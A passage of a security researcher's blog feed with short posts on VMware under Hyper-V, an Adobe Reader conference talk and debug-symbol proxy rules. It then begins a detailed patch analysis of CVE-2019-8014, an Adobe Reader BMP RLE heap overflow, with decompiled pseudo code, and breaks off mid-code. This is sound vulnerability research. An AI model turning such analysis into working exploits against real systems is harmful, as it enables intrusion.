work before version 15.5.5?</strong> </p><p>VMware Workstation traditionally has used a Virtual Machine Monitor (VMM) which operates in privileged mode requiring direct access to the CPU as well as access to the CPU’s built in virtualization support (Intel’s VT-x and AMD’s AMD-V).  When a Windows host enables Virtualization Based Security (“<a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs" target="_blank" rel="noopener">VBS</a>“) features, Windows adds a hypervisor layer based on Hyper-V between the hardware and Windows.  Any attempt to run VMware’s traditional VMM fails because being inside Hyper-V the VMM no longer has access to the hardware’s virtualization support.</p><p><strong>Introducing User Level Monitor</strong></p><p>To fix this Hyper-V/Host VBS compatibility issue, VMware’s platform team re-architected VMware’s Hypervisor to use Microsoft’s WHP APIs. This means <strong><em>changing our VMM to run at user level\</em></strong> instead of in privileged mode, as well modifying it to use the WHP APIs to manage the execution of a guest instead of using the underlying hardware directly.</p><p><strong>What does this mean to you?</strong></p><p>VMware Workstation/Player can now run when Hyper-V is enabled. You no longer have to choose between running VMware Workstation and Windows features like WSL, Device Guard and Credential Guard. When Hyper-V is enabled, ULM mode will automatically be used so you can run VMware Workstation normally. If you don’t use Hyper-V at all, VMware Workstation is smart enough to detect this and the VMM will be used.</p><p><strong>System Requirements</strong></p><p>To run Workstation/Player using the Windows Hypervisor APIs, the minimum required Windows 10 version is Windows 10 20H1 build 19041.264. VMware Workstation/Player minimum version is 15.5.5.</p></blockquote><p>不知道这个新引入的 User Level Monitor 对虚拟机的性能是否有影响。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 Windows 中启用 Hyper-V 之后，VMware Workstation 就不能用了，会提示“VMware Workstation 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VMware Workstation”，然而禁用 Device/Credential Guard 并不能解决问题。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="https://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="https://programlife.net/tags/Hyper-V/"/>
    
      <category term="VMware Workstation" scheme="https://programlife.net/tags/VMware-Workstation/"/>
    
  </entry>
  
  <entry>
    <title>Pwning Adobe Reader Multiple Times with Malformed Strings</title>
    <link href="https://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/"/>
    <id>https://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/</id>
    <published>2020-04-29T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>这次我在 HITB Lockdown Livestream 上发表了题为《<strong>Pwning Adobe Reader Multiple Times with Malformed Strings</strong>》的演讲，该演讲本来是为 HITB 2020 Amsterdam 准备的，但由于受疫情影响，主办方被迫取消了原来的会议安排，转而在 YouTube 上举办了一次免费的在线会议。</p><a id="more"></a><p>这次的议题是我在 ZeroNights 2019 上的演讲《<strong>Two Bytes to Rule Adobe Reader Twice: The Black Magic Behind the Byte Order Mark</strong>》的进一步研究，因此会有接近 40% 的内容是重复的。这次演讲精简了上一次演讲的内容，增加了对 Adobe JavaScript 引擎相关数据结构的分析，同时增加了 2 个新的可利用漏洞；最重要的是，这次我花了不少时间写了一篇非常详细的 Paper，方便感兴趣的同学自行开展漏洞分析工作。</p><p>值得一提的是，这次新增加的 2 个漏洞其实已经存了很久了，而距离上一次演讲已经过去了将近半年的时间，所以如果有人认真研究了我上一次演讲的内容的话，发现这 2 个漏洞也不是什么难事 :-)</p><p>议题文档：</p><ul><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_slides.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Slides</a></li><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_whitepaper.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Paper</a></li></ul><p><img src="/uploads/202004/hitb-livestream.png" alt="HITB Lockdown Livestream 演讲"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我在 HITB Lockdown Livestream 上发表了题为《&lt;strong&gt;Pwning Adobe Reader Multiple Times with Malformed Strings&lt;/strong&gt;》的演讲，该演讲本来是为 HITB 2020 Amsterdam 准备的，但由于受疫情影响，主办方被迫取消了原来的会议安排，转而在 YouTube 上举办了一次免费的在线会议。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Adobe Reader" scheme="https://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="CVE-2019-7032" scheme="https://programlife.net/tags/CVE-2019-7032/"/>
    
      <category term="CVE-2019-8199" scheme="https://programlife.net/tags/CVE-2019-8199/"/>
    
      <category term="CVE-2020-3804" scheme="https://programlife.net/tags/CVE-2020-3804/"/>
    
      <category term="CVE-2020-3805" scheme="https://programlife.net/tags/CVE-2020-3805/"/>
    
      <category term="PDF" scheme="https://programlife.net/tags/PDF/"/>
    
  </entry>
  
  <entry>
    <title>Windows 调试符号下载代理配置</title>
    <link href="https://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/"/>
    <id>https://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/</id>
    <published>2020-02-23T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>最近在 Windows 下调试程序时，发现无法下载微软提供的调试符号了（提示 <code>E_PDB_NOT_FOUND</code>），一开始以为是微软自己的原因，因为以往的经验表明，微软在 Patch Tuesday 之后的一段时间里可能就是无法正常下载调试符号。</p><p><img src="/uploads/202002/ida-pro-pdb-not-found.png" alt="IDA Pro 无法下载 Notepad 的调试符号"></p><a id="more"></a><p>后来发现，这次是无法从微软的服务器下载任何调试符号，比如使用 WinDbg 自带的 <code>symchk.exe</code> 无法给 System32 目录下的任一文件下载调试符号，而且在不同的机器上（拥有不同的代理上网环境）均不能下载调试符号，这就非常奇怪了。</p><p>笔者在某不存在的社交网站上反应了这个问题，有网友表示需要使用 VPN，也有网友表示需要绕过长城，还有网友表示 VPN 也不解决问题，而国外友人则表示完全不存在这个问题！很显然，这跟国内复杂的网络环境不无关系！</p><p>笔者打开了 Wireshark，想看看从微软的服务器下载调试符号时到底发生了什么。比如，在给 Notepad 下载调试符号时，后台访问的 URL 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://msdl.microsoft.com/download/symbols/notepad.pdb/BC0D363AF49A0E2C05B06DA4535DA0C71/notepad.pdb</span><br></pre></td></tr></table></figure><p>接着会重定向到以下地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://vsblobprodscussu5shard60.blob.core.windows.net/b-4712e0edc5a240eabf23330d7df68e77/F6311B221044787072987B74992D6DE770FCBBFED09C2853B4F10350CB964FF900.blob?sv=2017-04-17&amp;sr=b&amp;si=1&amp;sig=ulHtMVJpGWuEvNczzOR6J3g2rXS1s9qwwmEqJ1x63wg%3D&amp;spr=https&amp;se=2020-02-24T01%3A57%3A40Z&amp;rscl=x-e2eid-66439cf8-65874550-b9c5b293-e8bf7391-session-627c05ca-398743d1-b7a6ab61-b0fbc28f</span><br></pre></td></tr></table></figure><p>Chrome 提示 <code>ERR_CONNECTION_RESET</code> ，显然 <code>vsblobprodscussu5shard60.blob.core.windows.net</code> 被 Block 了。那为什么此时代理不管用了呢？而代理服务器本身是可以正常访问这个地址的，或者说，基于代理服务器上的 VPN 也可以正常访问这个地址。</p><p>后来发现，笔者使用的是 PAC 代理上网模式（<strong>Proxy Auto-Config</strong>，<a href="https://zh.wikipedia.org/zh-hans/%E4%BB%A3%E7%90%86%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE" target="_blank" rel="noopener">代理自动配置</a>），上网流量要不要经过代理服务器是根据 PAC 规则文件来定的（相对全局代理模式更加智能），而 <code>windows.net</code> 并没有出现在一些流行的 PAC 规则文件中，因此这里无法正常下载调试符号文件。</p><p>解决方案非常简单，给 PAC 规则文件增加一条记录 <code>.windows.net</code> ，表示支持 <code>windows.net</code> 下所有地址的访问。</p><p><img src="/uploads/202002/across-the-great-wall.png" alt="越过长城，走向世界"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在 Windows 下调试程序时，发现无法下载微软提供的调试符号了（提示 &lt;code&gt;E_PDB_NOT_FOUND&lt;/code&gt;），一开始以为是微软自己的原因，因为以往的经验表明，微软在 Patch Tuesday 之后的一段时间里可能就是无法正常下载调试符号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/202002/ida-pro-pdb-not-found.png&quot; alt=&quot;IDA Pro 无法下载 Notepad 的调试符号&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
    
      <category term="WinDbg" scheme="https://programlife.net/tags/WinDbg/"/>
    
  </entry>
  
  <entry>
    <title>Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago</title>
    <link href="https://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/"/>
    <id>https://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/</id>
    <published>2019-09-12T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p><em>This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was <del><strong>fixed</strong></del> six years ago. This post also discusses how to exploit the vulnerability.</em></p><p>Author: <strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p><a id="more"></a><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h2><p>Adobe released security updates for Adobe Acrobat and Reader in <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> in August. As usual, lots of vulnerabilities were fixed in the updates. When I was reviewing the corresponding advisories on <a href="https://www.zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">ZDI</a> , my attention was attracted by one of them: <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/" target="_blank" rel="noopener">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014" target="_blank" rel="noopener">CVE-2019-8014</a> . Following text is the title and description of this case:</p><blockquote><p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p><p>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p></blockquote><p>What surprised me most is that the flaw exists within the parsing of run length encoding in BMP images because I remembered that six years ago a similar case <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729" target="_blank" rel="noopener">CVE-2013-2729</a> was fixed in Adobe Reader. If you have the same wondering that what’s the relationship between CVE-2013-2729 and CVE-2019-8014, then let me reveal the truth for you.</p><p>By the way, the credit of CVE-2019-8014 goes to <code>ktkitty (https://ktkitty.github.io)</code> .</p><h2 id="0x02-Debugging-Environment"><a href="#0x02-Debugging-Environment" class="headerlink" title="0x02. Debugging Environment"></a>0x02. Debugging Environment</h2><p>Before diving deep into the details of the vulnerability, let’s set up the debugging environment first. According to <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> , <code>2019.012.20035</code> and earlier versions of Adobe Acrobat and Reader on Windows were affected, and the released version was <code>2019.012.20036</code> . We’ll carry out our analysis on these two versions.</p><p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20035</code> :</p><ol><li>Download and install <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/" target="_blank" rel="noopener">Download Link</a>)</li><li>Upgrade to <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/" target="_blank" rel="noopener">Download Link</a>)</li></ol><p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20036</code> :</p><ol><li>Download and install <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/" target="_blank" rel="noopener">Download Link</a>)</li></ol><p>Please remember to disconnect the Internet or disable the <em>Adobe Acrobat Update Service</em> , otherwise your Adobe Acrobat Reader DC will be updated automatically.</p><h2 id="0x03-Bitmap-Structures"><a href="#0x03-Bitmap-Structures" class="headerlink" title="0x03. Bitmap Structures"></a>0x03. Bitmap Structures</h2><p>Again, before diving deep into the details of the vulnerability, let’s learn some essential concepts of bitmap images. You can skip this section if you’re already familiar with it.</p><h3 id="3-1-Structures"><a href="#3-1-Structures" class="headerlink" title="3.1 Structures"></a>3.1 Structures</h3><p>Generally speaking, a bitmap image is composed of four parts:</p><ol><li>Bitmap File Header</li><li>Bitmap Info Header</li><li>RGBQUAD Array</li><li>Bitmap Data</li></ol><h4 id="3-1-1-Bitmap-File-Header"><a href="#3-1-1-Bitmap-File-Header" class="headerlink" title="3.1.1 Bitmap File Header"></a>3.1.1 Bitmap File Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader" target="_blank" rel="noopener">BITMAPFILEHEADER</a></strong> structure contains information about the type, size, and layout of the bitmap file. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// size of the bitmap file</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// offset of the bitmap bits</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure><h4 id="3-1-2-Bitmap-Info-Header"><a href="#3-1-2-Bitmap-Info-Header" class="headerlink" title="3.1.2 Bitmap Info Header"></a>3.1.2 Bitmap Info Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85" target="_blank" rel="noopener">BITMAPINFOHEADER</a>)</strong> structure contains information about the dimensions and color format of the bitmap file. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// sizeof(BITMAPINFOHEADER)</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// bitmap width</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// bitmap height</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// must be 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// bits per pixel</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// compression method</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// size of bitmap bits</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// horizontal resolution, pixels-per-meter</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// vertical resolution, pixels-per-meter</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// number of color indexes in the color table</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// number of color indexes that are required</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure><p>The value of <code>biCompression</code> represents the compression method of the bitmap. Following are some of the possible values of it:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// uncompressed format</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// run-length encoded (RLE) format with 8 bpp</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// run-length encoded (RLE) format with 4 bpp</span></span></span><br><span class="line"><span class="comment">// other compression methods...</span></span><br></pre></td></tr></table></figure><h4 id="3-1-3-RGBQUAD-Array"><a href="#3-1-3-RGBQUAD-Array" class="headerlink" title="3.1.3 RGBQUAD Array"></a>3.1.3 RGBQUAD Array</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad" target="_blank" rel="noopener">RGBQUAD</a></strong> structure describes a color consisting of relative intensities of red, green, and blue. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><p>The elements of the RGBQUAD array make up the color table. The number of entries in the array depends on the values of the <code>biBitCount</code> and <code>biClrUsed</code> members of the <strong>BITMAPINFOHEADER</strong> structure.</p><h4 id="3-1-4-Bitmap-Data"><a href="#3-1-4-Bitmap-Data" class="headerlink" title="3.1.4 Bitmap Data"></a>3.1.4 Bitmap Data</h4><p>Bits data of the bitmap. The layout of this section depends on the compression method of the bitmap.</p><p>One thing should be noted is that usually pixels are stored “bottom-up”, starting in the lower left corner, going from left to right, and then row by row from the bottom to the top of the image [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data" target="_blank" rel="noopener">wikipedia</a>)].</p><h3 id="3-2-Run-Length-Encoding"><a href="#3-2-Run-Length-Encoding" class="headerlink" title="3.2 Run Length Encoding"></a>3.2 Run Length Encoding</h3><p>Two types of <strong>run length encoding</strong> methods can be used in bitmap files: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab" target="_blank" rel="noopener">RLE4</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685" target="_blank" rel="noopener">RLE8</a> .</p><h4 id="3-2-1-RLE8"><a href="#3-2-1-RLE8" class="headerlink" title="3.2.1 RLE8"></a>3.2.1 RLE8</h4><p>The RLE8 compression algorithm is used to compress an 8-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p><p><strong>Encoded mode</strong> involves two bytes:</p><ul><li><p>If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the color index that is contained in the second byte.</p></li><li><p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p><ul><li>0x00 - End of line</li><li>0x01 - End of bitmap</li><li>0x02 - Delta</li></ul></li></ul><p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p><p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte represents the number of bytes that follow, each of which contains the color index of a single pixel. In absolute mode, each run is aligned on a word boundary.</p><p>The following example shows the hexadecimal contents of an 8-bit compressed bitmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>The bitmap expands as follows (two-digit values represent a color index for a single pixel):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h4 id="3-2-2-RLE4"><a href="#3-2-2-RLE4" class="headerlink" title="3.2.2 RLE4"></a>3.2.2 RLE4</h4><p>The RLE4 compression algorithm is used to compress a 4-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p><p><strong>Encoded mode</strong> involves two bytes. If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the two color indexes that are contained in the high-order and low-order bits of the second byte.</p><p>The first pixel is drawn using the color specified by the high-order 4 bits, the second is drawn using the color in the low-order 4 bits, the third is drawn using the color in the high-order 4 bits, and so on, until all the pixels specified by the first byte have been drawn.</p><p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p><ul><li>0x00 - End of line</li><li>0x01 - End of bitmap</li><li>0x02 - Delta</li></ul><p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p><p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte contains the number of 4-bit color indexes that follow. Subsequent bytes contain color indexes in their high- and low-order 4 bits, one color index for each pixel. In absolute mode, each run is aligned on a word boundary.</p><p>The following example shows the hexadecimal contents of a 4-bit compressed bitmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>The bitmap expands as follows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h2 id="0x04-Vulnerability-Details"><a href="#0x04-Vulnerability-Details" class="headerlink" title="0x04. Vulnerability Details"></a>0x04. Vulnerability Details</h2><h3 id="4-1-Code-Identification"><a href="#4-1-Code-Identification" class="headerlink" title="4.1 Code Identification"></a>4.1 Code Identification</h3><p>According to the advisory on ZDI’s website, we know that the flaw exists within the <strong>AcroForm</strong> module. It’s the forms plug-in of Adobe Acrobat Reader DC and is responsible for parsing <a href="https://en.wikipedia.org/wiki/XFA" target="_blank" rel="noopener">XFA forms</a> . Following is the path of binary file of this plug-in:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api</span><br></pre></td></tr></table></figure><p>Generally speaking, when doing patch analysis we may want to use <a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a> to help identify the changed functions between the old and new versions of the binary file. But it won’t be easy to find the target one if too many functions were changed. And that’s the case of <code>AcroForm.api</code> . Here we’ll use some trivial tricks to identify the related functions.</p><p>The following analysis was carried out on Adobe Acrobat Reader DC <code>2019.012.20035</code> . The same method can be applied to version <code>2019.012.20036</code> .</p><ol><li>Search string <code>PNG</code> in IDA and we’ll find one at <code>.rdata:20F9A374</code> </li><li>Find cross references to <code>20F9A374</code> and we’ll go to function <code>sub_20CF3A3F</code> </li><li>Obviously function <code>sub_20CF3A3F</code> is responsible for identifying the type of the image</li><li>Find cross references to <code>sub_20CF3A3F</code> and we’ll go to function <code>sub_20CF4BE8</code> </li><li>Function <code>sub_20CF4BE8</code> will call corresponding image parsing functions according to image types</li><li>Function <code>sub_20CF3E5F</code> , which will be called by function <code>sub_20CF4870</code> , is responsible for parsing bitmap images</li></ol><p>The result of BinDiff shows that some basic blocks were changed in function <code>sub_20CF3E5F</code> . Let’s take the basic block which begins at <code>20CF440F</code> as an example to show the difference.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F in AcroForm 2019.012.20035</span></span><br><span class="line"><span class="keyword">if</span> ( v131 &gt;= v26 || (<span class="keyword">unsigned</span> __int8)v127 + v43 &gt; v123 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">v56 = (<span class="keyword">unsigned</span> __int8)v130 + v43;</span><br><span class="line"><span class="keyword">if</span> ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (<span class="keyword">unsigned</span> __int8)v130 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>It’s obvious that the code was changed to prevent integer overflow circumstances.</p><h3 id="4-2-Vulnerability-Analysis"><a href="#4-2-Vulnerability-Analysis" class="headerlink" title="4.2 Vulnerability Analysis"></a>4.2 Vulnerability Analysis</h3><p>Thanks to <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a> , we can quickly understand what’s going on in function <code>sub_20CF3E5F</code> .</p><h4 id="4-2-1-RLE8-Decoding"><a href="#4-2-1-RLE8-Decoding" class="headerlink" title="4.2.1 RLE8 Decoding"></a>4.2.1 RLE8 Decoding</h4><p>Following pseudo code, which was extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE8 compressed data.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">1</span> )  <span class="comment">// RLE8 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  result = 